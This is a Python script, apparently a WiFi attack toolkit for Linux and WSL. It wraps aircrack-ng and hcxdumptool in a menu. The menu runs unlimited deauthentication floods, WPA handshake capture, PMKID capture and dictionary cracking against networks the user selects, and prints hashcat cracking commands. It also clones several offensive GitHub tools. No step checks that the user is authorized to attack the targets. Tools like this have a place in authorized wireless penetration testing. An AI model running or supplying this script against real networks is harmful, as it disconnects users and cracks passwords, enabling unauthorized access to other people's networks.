#!/usr/bin/env python3
import subprocess
import os
import sys
import time
import shutil
import signal

# Colors for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    print(f"{Colors.CYAN}")
    print(r"""
 __      __  _____  .____
/  \    /  \/ ____\ |    |
\   \/\/   /\   __\ |    |
 \        /  |  |   |    |___
  \__/\  /   |__|   |_______ \
       \/                   \/
    Advanced WiFi Toolkit
    (Linux/WSL Edition)
    """)
    print(f"{Colors.ENDC}")

def check_root():
    if os.geteuid() != 0:
        print(f"{Colors.FAIL}[!] This script requires root privileges.{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] Please run with: sudo python3 wsl_toolkit.py{Colors.ENDC}")
        sys.exit(1)

def check_dependencies():
    print(f"{Colors.BLUE}[*] Checking dependencies...{Colors.ENDC}")
    dependencies = ["airmon-ng", "airodump-ng", "aireplay-ng", "hcxdumptool"]
    missing = []

    for dep in dependencies:
        if shutil.which(dep) is None:
            missing.append(dep)

    if missing:
        print(f"{Colors.WARNING}[!] Missing tools: {', '.join(missing)}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Install them using:{Colors.ENDC}")
        print(f"    sudo apt-get update")
        print(f"    sudo apt-get install aircrack-ng hcxtools git python3-pip")
        input(f"\n{Colors.GREEN}Press Enter to continue anyway (some features may fail)...{Colors.ENDC}")
    else:
        print(f"{Colors.GREEN}[+] All dependencies found.{Colors.ENDC}")

def install_github_tools():
    print(f"{Colors.HEADER}[ INSTALLING TOOLS FROM GITHUB ]{Colors.ENDC}")

    tools_dir = "tools"
    if not os.path.exists(tools_dir):
        os.makedirs(tools_dir)
        # Fix permissions if created with sudo
        try:
            uid = int(os.environ.get('SUDO_UID', os.getuid()))
            gid = int(os.environ.get('SUDO_GID', os.getgid()))
            os.chown(tools_dir, uid, gid)
        except:
            pass

    repos = [
        "https://github.com/n0mi1k/pmkidcracker.git",
        "https://github.com/FLOCK4H/Freeway.git",
        "https://github.com/derv82/wifite2.git",
        "https://github.com/v1s1t0r1sh3r3/airgeddon.git"
    ]

    if shutil.which("git") is None:
        print(f"{Colors.FAIL}[!] Git not found. Installing...{Colors.ENDC}")
        subprocess.run(["apt-get", "update"], check=False)
        subprocess.run(["apt-get", "install", "-y", "git"], check=False)

    for repo in repos:
        name = repo.split("/")[-1].replace(".git", "")
        path = os.path.join(tools_dir, name)

        if os.path.exists(path):
            print(f"{Colors.BLUE}[*] Updating {name}...{Colors.ENDC}")
            subprocess.run(["git", "-C", path, "pull"], check=False)
        else:
            print(f"{Colors.GREEN}[+] Cloning {name}...{Colors.ENDC}")
            subprocess.run(["git", "clone", repo, path], check=False)

            # Fix permissions for cloned repo
            try:
                uid = int(os.environ.get('SUDO_UID', os.getuid()))
                gid = int(os.environ.get('SUDO_GID', os.getgid()))
                for root, dirs, files in os.walk(path):
                    os.chown(root, uid, gid)
                    for d in dirs:
                        os.chown(os.path.join(root, d), uid, gid)
                    for f in files:
                        os.chown(os.path.join(root, f), uid, gid)
            except:
                pass

    print(f"{Colors.GREEN}[+] All tools installed in ./{tools_dir}{Colors.ENDC}")
    input(f"\n{Colors.GREEN}Press Enter to return to menu...{Colors.ENDC}")

def get_interfaces():
    try:
        result = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT).decode()
        interfaces = []
        for line in result.split('\n'):
            if len(line) > 0 and not line.startswith(' '):
                iface = line.split(' ')[0]
                if iface:
                    interfaces.append(iface)
        return interfaces
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error getting interfaces: {e}{Colors.ENDC}")
        return []

def enable_monitor_mode(interface):
    print(f"{Colors.BLUE}[*] Enabling monitor mode on {interface}...{Colors.ENDC}")
    try:
        subprocess.run(["airmon-ng", "check", "kill"], check=False)
        subprocess.run(["airmon-ng", "start", interface], check=True)
        print(f"{Colors.GREEN}[+] Monitor mode enabled.{Colors.ENDC}")
        return True
    except subprocess.CalledProcessError:
        print(f"{Colors.FAIL}[!] Failed to enable monitor mode.{Colors.ENDC}")
        return False

def scan_networks(interface):
    print(f"{Colors.BLUE}[*] Starting scan on {interface}...{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] Press CTRL+C to stop scanning and view targets.{Colors.ENDC}")
    time.sleep(2)

    csv_file = "scan_results"
    try:
        # Remove old files
        for ext in [".csv", "-01.csv"]:
            if os.path.exists(csv_file + ext):
                os.remove(csv_file + ext)

        cmd = ["airodump-ng", "--output-format", "csv", "-w", csv_file, interface]
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}[+] Scan stopped.{Colors.ENDC}")

    # Parse results
    targets = []
    if os.path.exists(csv_file + "-01.csv"):
        with open(csv_file + "-01.csv", "r") as f:
            lines = f.readlines()
            for line in lines:
                parts = line.split(',')
                if len(parts) >= 14 and "BSSID" not in parts[0]:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    privacy = parts[5].strip()
                    power = parts[8].strip()
                    ssid = parts[13].strip()
                    if bssid and ssid:
                        targets.append({"BSSID": bssid, "CH": channel, "ENC": privacy, "PWR": power, "SSID": ssid})
    return targets

def deauth_attack(interface, target_bssid, channel):
    print(f"{Colors.HEADER}[ DEAUTHENTICATION ATTACK ]{Colors.ENDC}")

    # Set channel
    print(f"{Colors.BLUE}[*] Switching {interface} to channel {channel}...{Colors.ENDC}")
    subprocess.run(["iwconfig", interface, "channel", channel], check=False)

    print(f"{Colors.WARNING}[!] Sending deauth packets to {target_bssid}. Press CTRL+C to stop.{Colors.ENDC}")
    try:
        # 0 means unlimited deauths (until stopped)
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", target_bssid, interface])
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}[+] Attack stopped.{Colors.ENDC}")

def capture_handshake(interface, target_bssid, channel, ssid):
    print(f"{Colors.HEADER}[ HANDSHAKE CAPTURE ]{Colors.ENDC}")

    output_file = f"handshake_{ssid.replace(' ', '_')}"

    print(f"{Colors.BLUE}[*] Starting capture on {target_bssid} (CH: {channel})...{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] Waiting for handshake. You can run a deauth attack in another terminal to speed this up.{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] Press CTRL+C to stop.{Colors.ENDC}")

    try:
        cmd = ["airodump-ng", "-c", channel, "--bssid", target_bssid, "-w", output_file, interface]
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}[+] Capture stopped.{Colors.ENDC}")

    print(f"{Colors.BLUE}[*] Check for .cap files starting with {output_file}{Colors.ENDC}")

def pmkid_attack(interface):
    print(f"{Colors.HEADER}[ PMKID ATTACK (Client-less) ]{Colors.ENDC}")

    if shutil.which("hcxdumptool") is None:
        print(f"{Colors.FAIL}[!] hcxdumptool not found. Install 'hcxtools'.{Colors.ENDC}")
        return

    print(f"{Colors.BLUE}[*] Starting PMKID attack on all channels...{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] This attack works without clients connected to the AP.{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] Press CTRL+C to stop.{Colors.ENDC}")

    timestamp = int(time.time())
    pcapng_file = f"pmkid_{timestamp}.pcapng"

    try:
        # hcxdumptool -i interface -o output.pcapng --enable_status=1
        cmd = ["hcxdumptool", "-i", interface, "-o", pcapng_file, "--enable_status=1"]
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}[+] Attack stopped.{Colors.ENDC}")

    if os.path.exists(pcapng_file):
        print(f"{Colors.GREEN}[+] Capture saved to {pcapng_file}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] To crack: hcxpcapngtool -o hash.hc22000 -E essidlist {pcapng_file}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Then run hashcat -m 22000 hash.hc22000 wordlist.txt{Colors.ENDC}")

def crack_handshake():
    print(f"{Colors.HEADER}[ CRACK HANDSHAKE (.cap) ]{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] This uses aircrack-ng to crack a captured handshake file.{Colors.ENDC}")
    print(f"{Colors.WARNING}[*] CPU-intensive! Works without WiFi adapter.{Colors.ENDC}")

    cap_file = input(f"Enter path to .cap file: ")
    if not os.path.exists(cap_file):
        print(f"{Colors.FAIL}[!] File not found.{Colors.ENDC}")
        return

    wordlist = input(f"Enter path to wordlist (default: wordlists/default.txt): ")
    if not wordlist:
        wordlist = "wordlists/default.txt"

    if not os.path.exists(wordlist):
        print(f"{Colors.WARNING}[!] Wordlist not found. Checking common locations...{Colors.ENDC}")
        if os.path.exists("/usr/share/wordlists/rockyou.txt"):
            wordlist = "/usr/share/wordlists/rockyou.txt"
            print(f"{Colors.GREEN}[+] Using rockyou.txt{Colors.ENDC}")
        else:
             print(f"{Colors.FAIL}[!] No wordlist found.{Colors.ENDC}")
             return

    print(f"{Colors.GREEN}[*] Starting aircrack-ng...{Colors.ENDC}")
    try:
        subprocess.run(["aircrack-ng", "-w", wordlist, cap_file])
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error running aircrack-ng: {e}{Colors.ENDC}")

    input(f"\n{Colors.GREEN}Press Enter to return to menu...{Colors.ENDC}")

def show_compatibility_info():
    print(f"{Colors.HEADER}[ HARDWARE COMPATIBILITY INFO ]{Colors.ENDC}")
    print(f"{Colors.BLUE}Q: Can I use my phone instead of a USB WiFi adapter?{Colors.ENDC}")
    print(f"{Colors.WARNING}A: Generally, NO.{Colors.ENDC}")
    print(f"""
    Standard Android/iOS phones cannot be used as monitor-mode WiFi adapters
    for WSL or standard Linux tools directly over USB.

    Why?
    1. Phones present themselves as a network interface (rndis), not a raw WiFi card.
    2. WSL/Linux sees an ethernet connection, not the WiFi radio hardware.
    3. Monitor mode requires direct hardware control to see raw packets.

    {Colors.BLUE}Q: Can I use a MiFi / Mobile Hotspot (e.g., MiFi 8800L)?{Colors.ENDC}
    {Colors.WARNING}A: NO.{Colors.ENDC}
    MiFi devices are routers. When connected via USB, they act as a wired network
    card (RNDIS). The computer cannot control the MiFi's internal radio to
    scan channels or inject packets.

    {Colors.BLUE}Q: Can I change the firmware (OpenWrt / NetHunter)?{Colors.ENDC}
    {Colors.WARNING}A: It rarely helps for this specific purpose.{Colors.ENDC}
    - **MiFi 8800L:** Bootloaders are locked. Even with custom firmware, the USB
      interface is designed for networking, not raw radio control.
    - **Phones:** Installing **Kali NetHunter** allows you to run attacks *ON* the
      phone, but it does NOT turn the phone into a USB adapter for your PC.
      Also, most phone internal WiFi chips do not support monitor mode even
      with NetHunter (you still need an external USB adapter for the phone).

    Exceptions (Advanced):
    - Rooted Android with a custom kernel supporting external WiFi adapters (NetHunter).
    - Rooted Android with 'mon0' enabled internally, using TCP packet forwarding (very complex).

    Recommendation:
    - Use a supported USB WiFi Adapter (e.g., Alfa AWUS036NHA, TP-Link TL-WN722N v1).
    - Ensure it supports 'Monitor Mode' and 'Packet Injection'.
    """)
    input(f"\n{Colors.GREEN}Press Enter to return to menu...{Colors.ENDC}")

def main():
    os.system('clear')
    print_banner()
    check_root()
    check_dependencies()

    interfaces = get_interfaces()
    selected_iface = None

    if not interfaces:
        print(f"{Colors.FAIL}[!] No wireless interfaces found.{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] If using WSL, ensure you have a USB WiFi adapter attached via USBIPD.{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] Continuing in limited mode (Tool Download / Offline only).{Colors.ENDC}")
    else:
        print(f"{Colors.BLUE}[*] Available Interfaces:{Colors.ENDC}")
        for i, iface in enumerate(interfaces):
            print(f"  {i+1}. {iface}")

        try:
            choice = int(input(f"\n{Colors.GREEN}Select Interface (number): {Colors.ENDC}"))
            selected_iface = interfaces[choice-1]
        except (ValueError, IndexError):
            print(f"{Colors.FAIL}[!] Invalid selection.{Colors.ENDC}")
            sys.exit(1)

        # Ask to enable monitor mode
        if "mon" not in selected_iface:
            resp = input(f"{Colors.WARNING}[?] Enable monitor mode on {selected_iface}? (y/n): {Colors.ENDC}")
            if resp.lower() == 'y':
                if enable_monitor_mode(selected_iface):
                    # Update interface name (usually adds 'mon' suffix or changes name)
                    interfaces = get_interfaces()
                    # Simple heuristic to find the new monitor interface
                    # In a real scenario, we'd parse airmon-ng output, but this is often sufficient
                    for iface in interfaces:
                        if "mon" in iface or iface != selected_iface:
                            selected_iface = iface
                            break
                    print(f"{Colors.GREEN}[+] Using interface: {selected_iface}{Colors.ENDC}")

    while True:
        print(f"\n{Colors.HEADER}=== WSL/Linux Attack Menu ==={Colors.ENDC}")
        print("1. Scan for Networks (airodump-ng)")
        print("2. Deauthentication Attack (Disconnect clients)")
        print("3. Capture Handshake (WPA/WPA2)")
        print("4. PMKID Attack (Client-less)")
        print("5. Crack Handshake (.cap file) - [Offline]")
        print("6. Download/Update Extra Tools (Freeway, PMKIDCracker, etc.)")
        print("7. Hardware Compatibility Info (Phone vs USB)")
        print("0. Exit")

        choice = input(f"\n{Colors.GREEN}Select Option: {Colors.ENDC}")

        if choice == '1':
            if not selected_iface:
                print(f"{Colors.FAIL}[!] No wireless interface available for this action.{Colors.ENDC}")
                continue
            targets = scan_networks(selected_iface)
            print(f"\n{Colors.HEADER}Targets Found:{Colors.ENDC}")
            print(f"{'ID':<4} {'BSSID':<20} {'CH':<4} {'PWR':<5} {'ENC':<6} {'SSID'}")
            print("-" * 60)
            for i, t in enumerate(targets):
                print(f"{i+1:<4} {t['BSSID']:<20} {t['CH']:<4} {t['PWR']:<5} {t['ENC']:<6} {t['SSID']}")

        elif choice == '2':
            if not selected_iface:
                print(f"{Colors.FAIL}[!] No wireless interface available for this action.{Colors.ENDC}")
                continue
            bssid = input("Enter Target BSSID: ")
            channel = input("Enter Target Channel: ")
            deauth_attack(selected_iface, bssid, channel)

        elif choice == '3':
            if not selected_iface:
                print(f"{Colors.FAIL}[!] No wireless interface available for this action.{Colors.ENDC}")
                continue
            bssid = input("Enter Target BSSID: ")
            channel = input("Enter Target Channel: ")
            ssid = input("Enter Target SSID (for filename): ")
            capture_handshake(selected_iface, bssid, channel, ssid)

        elif choice == '4':
            if not selected_iface:
                print(f"{Colors.FAIL}[!] No wireless interface available for this action.{Colors.ENDC}")
                continue
            pmkid_attack(selected_iface)

        elif choice == '5':
            crack_handshake()

        elif choice == '6':
            install_github_tools()

        elif choice == '7':
            show_compatibility_info()

        elif choice == '0':
            break
        else:
            print(f"{Colors.FAIL}[!] Invalid option.{Colors.ENDC}")

if __name__ == "__main__":
    main()
